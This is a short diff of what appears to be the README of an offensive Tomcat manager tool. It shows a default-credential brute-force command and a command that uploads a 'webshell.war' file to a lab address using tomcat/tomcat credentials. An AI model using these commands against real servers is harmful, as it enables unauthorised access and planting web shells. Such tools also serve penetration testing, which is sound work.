@@ -56,7 +56,10 @@ $ python tomcat.py -v  bf -U tomcat_mgr_default_users.txt -P tomcat_mgr_default_
 [2016-06-10 17:24:56.191] DEBUG    Closing socket...
 ```
 
-* WAR upload (WIP)
+* WAR upload
 ```
-$ python tomcat.py upload -u tomcat -p tomcat webshell.war 172.17.0.2 /manager/html
+$ python tomcat.py upload -u tomcat -p tomcat webshell.war 172.17.0.2
 ```
+
+# Thanks
+* @MrTchuss for the Tomcat WAR upload fix
